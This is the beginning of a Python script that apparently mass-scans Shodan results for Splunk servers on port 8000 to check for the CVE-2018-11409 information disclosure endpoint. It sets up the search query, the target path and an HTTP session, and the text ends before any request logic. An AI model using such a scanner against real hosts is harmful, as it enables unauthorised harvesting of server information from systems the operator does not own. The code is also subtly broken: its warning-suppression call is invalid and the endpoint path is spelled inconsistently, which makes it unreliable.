#!/usr/bin/env python

# splunk-info.py
# This script aims to identify the CVE-2018-11409 information disclosure vulnerability in splunk located at   path "/en-US/splunkd/_raw/services/server/info/server-info?output_mode=json".

import shodan
import sys
import re
import requests
from time import sleep
from requests.auth import HTTPBasicAuth
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.package.urllib.disable_warning(InsecureRequestWarning)

API_KEY = "YOUR_API_KEY"
SEARCH_FOR = 'splunk port:"8000"'
FILE = "/en-US/splunkd/__raw/services/server/info/server-info?output_mode=json"
session = requests.Session()



